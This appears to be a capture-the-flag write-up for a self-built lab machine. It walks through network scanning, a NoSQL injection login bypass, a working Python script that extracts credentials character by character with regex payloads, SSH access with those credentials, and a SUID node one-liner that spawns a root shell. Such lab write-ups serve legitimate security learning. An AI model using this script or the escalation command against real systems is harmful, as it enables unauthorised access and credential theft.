---
Platform: CreatedByMe
Category: Web
tags:
  - No-SQL-Injection
  - suid
Status: Rooted/Finished
Type: Machine
Title: NoSQLInjection
Difficulty: 
CreatedOn: 04-12-2023
---
# NoSQLInjection

First start the machine in VMware.

![[NoSQLInjection/assets/Untitled.png|Untitled.png]]

After the login screen appears, from your host machine, run a ping sweep on the entire network that you are connected to. To do this, in my case I have used the `nmap` tool. You can use the tool of your choice.

Command: `nmap -sn 192.168.0.1/24`

![[NoSQLInjection/assets/Untitled 1.png|Untitled 1.png]]

From the scan results, you can find all the devices that are up in the network your are connected. From the list of results, filter all the devices that you know [ may be your mobile that is connected to the same wifi and also other devices ], you will be left with the target machines IP.

  

Now we have found the target IP address. It’s time to scan the target for open ports. I have used `rustscan` [ [https://github.com/RustScan/RustScan](https://github.com/RustScan/RustScan) ] to perform this task. You can also use `nmap` or any other tool of your choice.

Command: `rustscan -a 192.168.0.107 -- -A -T4 -v`

![[NoSQLInjection/assets/Untitled 2.png|Untitled 2.png]]

![[NoSQLInjection/assets/Untitled 3.png|Untitled 3.png]]

From the results of `rustscan`, we can devise that the following ports are open:

|**Port**|**Service**|
|---|---|
|22|SSH|
|80|HTTP|

Next I visited the website.

![[NoSQLInjection/assets/Untitled 4.png|Untitled 4.png]]

Its just a simple login form. I checked the technologies that are used to build this website by using `wappalyzer` extension.

From the results of `wappalyzer`, we can see that the application has been built on `NodeJS` and `ExpressJS`.

Most applications that are built with `NodeJS` and `ExpressJS`, use `MongoDB` as the database, which is a `NoSQL` database.

So I checked whether the application is vulnerable to `NoSQL` Injection. For that I used some of the payloads from: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection#authentication-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass), to perform `NoSQL` Injection.

![[NoSQLInjection/assets/Untitled 5.png|Untitled 5.png]]

I used the above payload in both username and password fields.

![[NoSQLInjection/assets/Untitled 6.png|Untitled 6.png]]

But the payload didn’t work, thus it’s not vulnerable to `NoSQL` Injection, or it might be the front-end validation or input sanitation that happens in the browser, with the help of `javascript`.

So, I intercepted the login request with `burpsuite` and tried to bypass authentication with the same payload.

![[NoSQLInjection/assets/Untitled 7.png|Untitled 7.png]]

The payload worked, we have successfully bypassed the authentication and obtained our first flag.

Now its confirm that the application is vulnerable to `NoSQL` Injection. If you check the same website from where we got the payload [ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection#extract-data-information](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#extract-data-information) ], we can extract data from the database using `NoSQL` Injection.

So we can try to extract the username and password from the database using a python script, by using the following payloads:

![[NoSQLInjection/assets/Untitled 8.png|Untitled 8.png]]

If you scroll down below on the same website, you can also see an example python script to extract data recursively [ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection#get](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#get) ].

![[NoSQLInjection/assets/Untitled 9.png|Untitled 9.png]]

From the above example script, I have created a script that will extract the username and password from the application:

```
# Username and Password Enumeration Script

import requests
import string
import sys

url = "http://192.168.0.107/api/users/login"
headers = {"Content-Type": "application/json"}
characters = string.ascii_letters + string.digits

def enumerateUsername():
    global url
    global headers

    status_Username = True
    username = ""

    while status_Username:
        data = {
            "username": {"$regex": f"^{username}$"},
            "password": {"$gt":""}
        }

        response = requests.post(url, headers=headers, json=data)

        if "Invalid Credentials" not in response.text:
            status_Username = False
            sys.stdout.write(f"\rUsername: {username}")
            sys.stdout.flush()
            break

        else:
            for each in characters:
                data = {
                    "username": {"$regex": f"^{username}{each}"},
                    "password": {"$gt":""}
                }

                response = requests.post(url, headers=headers, json=data)

                if "Invalid Credentials" not in response.text:
                    username += each
                    sys.stdout.flush()
                    break

                sys.stdout.write(f"\rUsername: {username}{each}")
                sys.stdout.flush()
    
    return username

def enumeratePassword(username):
    global url
    global headers
    
    status_Password = True
    password = ""

    while status_Password:
        data = {
            "username": username,
            "password": {"$regex": f"^{password}$"}
        }

        response = requests.post(url, headers=headers, json=data)

        if "Invalid Credentials" not in response.text:
            status_Password = False
            sys.stdout.write(f"\rPassword: {password}")
            sys.stdout.flush()
            break

        else:
            for each in characters:
                data = {
                    "username": {"$gt":""},
                    "password": {"$regex": f"^{password}{each}"}
                }

                response = requests.post(url, headers=headers, json=data)

                if "Invalid Credentials" not in response.text:
                    password += each
                    sys.stdout.flush()
                    break

                sys.stdout.write(f"\rPassword: {password}{each}")
                sys.stdout.flush()

    return password

if __name__ == "__main__":
    username = enumerateUsername()
    print()
    password = enumeratePassword(username)
    print()
```

Now its time to run the script.

> [!important]  
> The script might take a few minutes to completely extract the data, since data can be extracted by one character at a time. So be patient….  

![[NoSQLInjection/assets/Untitled 10.png|Untitled 10.png]]

From the results of the script we have got the credentials. To verify the credentials, let’s try to login with the credentials on the web app.

![[NoSQLInjection/assets/Untitled 11.png|Untitled 11.png]]

It worked and we have got the correct credentials. But these credentials doesn’t do much in the web app. Since, I know that SSH service is running on the target, I tried to login via SSH using the extracted credentials.

![[NoSQLInjection/assets/Untitled 12.png|Untitled 12.png]]

I was able to login successfully via SSH using the extracted credentials and also got the second/user flag.

Now it’s time to find the root flag, by privilege escalation.

# Privilege Escalation

I was looking out for some of the privilege escalation vectors. While looking out for files with `SUID` bit in their file permission, using the command: `find / -type f -perm -4000 2>/dev/null`, I found that the `/usr/bin/node` application has `SUID` bit set on it, which is very unusual.

![[NoSQLInjection/assets/Untitled 13.png|Untitled 13.png]]

So next I checked [https://gtfobins.github.io/gtfobins/node/#suid](https://gtfobins.github.io/gtfobins/node/#suid) for some technique for privilege escalation using this `node` application.

![[NoSQLInjection/assets/Untitled 14.png|Untitled 14.png]]

From the above section, I used the second payload to get a bash prompt with root privilege.

Command: `node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'`

![[NoSQLInjection/assets/Untitled 15.png|Untitled 15.png]]

I found the root flag at `/root` directory.

![[NoSQLInjection/assets/Untitled 16.png|Untitled 16.png]]

We have successfully found all the flags.

  

Thank You……